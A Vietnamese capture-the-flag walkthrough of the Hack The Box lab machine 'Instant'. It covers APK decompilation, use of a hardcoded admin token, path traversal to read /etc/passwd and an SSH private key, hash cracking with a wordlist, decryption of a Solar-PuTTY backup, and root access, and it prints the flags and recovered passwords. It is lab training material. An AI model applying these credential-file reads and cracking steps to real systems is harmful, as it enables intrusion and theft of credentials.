# Instant

<img width="1381" height="634" alt="image" src="https://github.com/user-attachments/assets/1c3410d7-79a3-4714-b0b6-96c607f7bfc0" />

Đầu tiên tôi dùng nmap để scan các port của mục tiêu:

```
❯ sudo nmap -sV -p- 10.10.11.37
[sudo] password for namdeptrai: 
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-19 15:36 +0700

❯ sudo nmap -sV 10.10.11.37
Starting Nmap 7.97 ( https://nmap.org ) at 2025-09-19 15:36 +0700
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
```

Đây là giao diện của trang web, khi bấm vào download thì tải về file `instant.apk`:

<img width="1865" height="952" alt="image" src="https://github.com/user-attachments/assets/5db58d27-41a1-4833-b93d-a4100266ed6b" />

```
❯ file instant.apk
instant.apk: Android package (APK), with gradle app-metadata.properties, with APK Signing Block
```

Dùng công cụ jadx `jadx instant.apk` để dịch ngược lại file đó và ra được:

<img width="1553" height="921" alt="image" src="https://github.com/user-attachments/assets/b5a317a3-b99c-4b97-92d8-49f842421e1b" />

Đọc nội dung file `resources/res/xml/network_security_config.xml` thì biết được 2 cái subdomain lần lượt là `mywalletv1.instant.htb` và `swagger-ui.instant.htb`:

<img width="1065" height="560" alt="image" src="https://github.com/user-attachments/assets/c599844d-9844-4bbb-be00-c4982fd34585" />

Trong `swagger-ui.instant.htb` lại là `Swagger UI`, có các api:

<img width="1719" height="888" alt="image" src="https://github.com/user-attachments/assets/4c435425-e6a9-411c-9f6e-9fdfef47761d" />

Có api `/api/v1/admin/read/log` nghi vấn có thể bị dính path traversal, truy cập vào thì trả về 401:

<img width="1219" height="513" alt="image" src="https://github.com/user-attachments/assets/cfa0012a-1418-4210-9821-ff2ff5ff03ef" />

Đọc bên src code thì có thấy thêm header `Authorization` của admin:

<img width="1636" height="948" alt="image" src="https://github.com/user-attachments/assets/c896055a-bf7d-4223-85d7-2a91a58113a7" />

Thêm header vào và thử path traversal thì được:

<img width="1569" height="842" alt="image" src="https://github.com/user-attachments/assets/22babc09-ec50-450e-85f4-478ed3a61e7f" />

Nhìn vào file `/etc/passwd` thì thấy được user `shirohige` có vẻ nghịch được, tôi thử đọc ssh xem như nào:

<img width="1488" height="872" alt="image" src="https://github.com/user-attachments/assets/221980d9-7d00-4596-8bc9-d589d4405266" />

Và đã có được `id_rsa`, tiếp theo thì login vào:

```
❯ chmod 600 id_rsa
❯ ssh -i id_rsa shirohige@10.10.11.37
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Sep 19 06:50:39 2025 from 10.10.14.8
shirohige@instant:~$ cat user.txt 
be7c7aa484cb162e403dbe0cb60a7320
```

Trong quá trình khám phá tôi có tìm thấy file backup:

```
shirohige@instant:~$ ls /opt/backups/Solar-PuTTY/
sessions-backup.dat
```

Tôi search google cách để mở file, tìm được đường link [này](https://github.com/VoidSec/SolarPuttyDecrypt)

<img width="1364" height="516" alt="image" src="https://github.com/user-attachments/assets/90cd3a50-c5f2-4a8b-ac97-77ed112af005" />

Nhưng khi mở thì yêu cầu mật khẩu, thế nên tôi để đó rồi đi khám phá tiếp.

Tôi tìm được file databases:

```
shirohige@instant:~$ ls projects/mywallet/Instant-Api/mywallet/instance/
instant.db
shirohige@instant:~$ pwd
/home/shirohige
```

Sau khi xem file database đó thì thấy được 3 cái hash mật khẩu được dùng `pbkdf2`:

<img width="1862" height="399" alt="image" src="https://github.com/user-attachments/assets/3e0a7d3a-8aa6-4b54-8812-f45df83bc715" />

Do dùng hashcat với john không crack được (tôi stuck ở việc format lại hash), thế nên tôi search công cụ khác và tìm được [Werkzeug Cracker](https://github.com/AnataarXVI/Werkzeug-Cracker):

<img width="1297" height="640" alt="image" src="https://github.com/user-attachments/assets/f646a363-6711-4a3b-9149-7cc1695158d4" />

Sử dụng công cụ để crack được mật khẩu của `shirohige` là:

```
❯ python3 werkzeug_cracker.py -w ~/wordlist/rockyou.txt -p ~/hashcat/target.txt
Cracking pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed |                                | 122/14445388
Password found: estrella
```

<img width="1337" height="868" alt="image" src="https://github.com/user-attachments/assets/ac7ddbf8-e3ad-4147-aca9-9f01db8728f8" />

Tìm được mật khẩu của `root` là `12**24nzC!r0c%q12`

Dùng mật khẩu đó thì leo được quyền root và thực thi các lệnh dưới quyền root:

```
shirohige@instant:~$ su -
Password: 
root@instant:~# cat /root/root.txt 
7abd488d8df3c5d47d95775b76d4f22e
```
